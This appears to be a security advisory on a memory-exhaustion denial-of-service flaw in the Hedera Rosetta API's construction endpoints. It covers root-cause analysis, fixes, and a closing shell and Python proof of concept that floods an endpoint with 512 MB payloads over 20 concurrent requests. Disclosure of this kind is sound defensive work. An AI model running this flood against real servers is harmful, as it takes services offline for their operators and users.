### Title
Unbounded Heap Allocation via Oversized Hex String in Construction Endpoints Leading to Memory Exhaustion DoS

### Summary
The `unmarshallTransactionFromHexString` function in `rosetta/app/services/construction_service.go` calls `hex.DecodeString` on attacker-controlled input with no prior length check or HTTP body size limit. An unauthenticated attacker can POST arbitrarily large hex strings to any of the four construction endpoints, causing Go's runtime to allocate a byte slice proportional to the input length before returning `ErrTransactionDecodeFailed`, exhausting heap memory under concurrent load.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, function `unmarshallTransactionFromHexString`, lines 658–662:
```go
func unmarshallTransactionFromHexString(transactionString string) (hiero.TransactionInterface, *rTypes.Error) {
    transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
    if err != nil {
        return nil, errors.ErrTransactionDecodeFailed
    }
```

This function is called unconditionally (no length guard) from four public endpoints:
- `ConstructionCombine` (line 62) → `/construction/combine`
- `ConstructionHash` (line 121) → `/construction/hash`
- `ConstructionParse` (line 187) → `/construction/parse`
- `ConstructionSubmit` (line 340) → `/construction/submit`

**Root cause:** Go's `hex.DecodeString` internally executes `src := []byte(s)`, allocating a full copy of the input string as a byte slice before any decoding or validation occurs. For a 1 GB hex string, this allocates ~1 GB on the heap per call. The JSON body is also fully buffered by the rosetta-sdk-go router before reaching this code, meaning total per-request heap pressure is approximately 2–3× the input size.

**Why existing checks fail:**

The `Http` config struct (`rosetta/app/config/types.go`, lines 64–69) only configures `IdleTimeout`, `ReadTimeout`, `ReadHeaderTimeout`, and `WriteTimeout`. The HTTP server in `main.go` (lines 220–227) applies only these timeout values — there is no `http.MaxBytesReader` wrapping the request body anywhere in the middleware chain. A grep for `MaxBytesReader`, `LimitReader`, or any body-size limit returns zero matches across the entire rosetta codebase. No rate-limiting middleware exists either; the only middleware layers are `MetricsMiddleware`, `TracingMiddleware`, and `CorsMiddleware`.

A `ReadTimeout` can slow the attack but does not prevent it: on a co-located or high-bandwidth connection, gigabytes can be transferred within a typical 30-second timeout window, and the allocation occurs as the body is parsed, not after.

### Impact Explanation
An attacker sending concurrent requests each containing a multi-hundred-megabyte hex string can exhaust the process heap, causing an OOM kill or severe GC pressure that renders the Rosetta API unresponsive. All four affected endpoints are unauthenticated per the Rosetta specification. Both online and offline modes are affected (offline mode still exposes `/construction/combine`, `/construction/hash`, `/construction/parse`). This constitutes a non-network-based DoS requiring no privileges.

### Likelihood Explanation
The attack requires no credentials, no prior knowledge of the system state, and no special tooling — a single `curl` command with a large body suffices. The endpoints are part of the public Rosetta API surface. The attack is trivially repeatable and scriptable. Concurrent requests amplify impact multiplicatively. No existing defense (authentication, rate limiting, body size cap) is present in the codebase.

### Recommendation
1. **Enforce a maximum body size** at the HTTP layer by wrapping `r.Body` with `http.MaxBytesReader` in a middleware applied before routing, e.g., limiting to 1 MB (well above any legitimate Hedera transaction size).
2. **Add an explicit length guard** inside `unmarshallTransactionFromHexString` before calling `hex.DecodeString`:
   ```go
   const maxTransactionHexLen = 2 * 1024 * 1024 // 1 MB decoded
   if len(transactionString) > maxTransactionHexLen {
       return nil, errors.ErrTransactionDecodeFailed
   }
   ```
3. **Add rate limiting** per IP on construction endpoints using a token-bucket middleware.

### Proof of Concept
```bash
# Generate a 512 MB hex string of valid hex characters (all zeros)
python3 -c "print('0' * 536870912)" > /tmp/big_hex.txt

# Craft the JSON payload for /construction/hash
python3 -c "
import json, sys
data = {'network_identifier': {'blockchain': 'Hedera', 'network': 'testnet'},
        'signed_transaction': '0' * 536870912}
print(json.dumps(data))" > /tmp/payload.json

# Send 20 concurrent requests to exhaust heap
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/construction/hash \
    -H 'Content-Type: application/json' \
    -d @/tmp/payload.json &
done
wait
```
Each request causes `hex.DecodeString` to allocate ~256 MB; 20 concurrent requests attempt ~5 GB of allocation, triggering OOM or severe GC stalls. The same payload works against `/construction/combine`, `/construction/parse`, and `/construction/submit`.
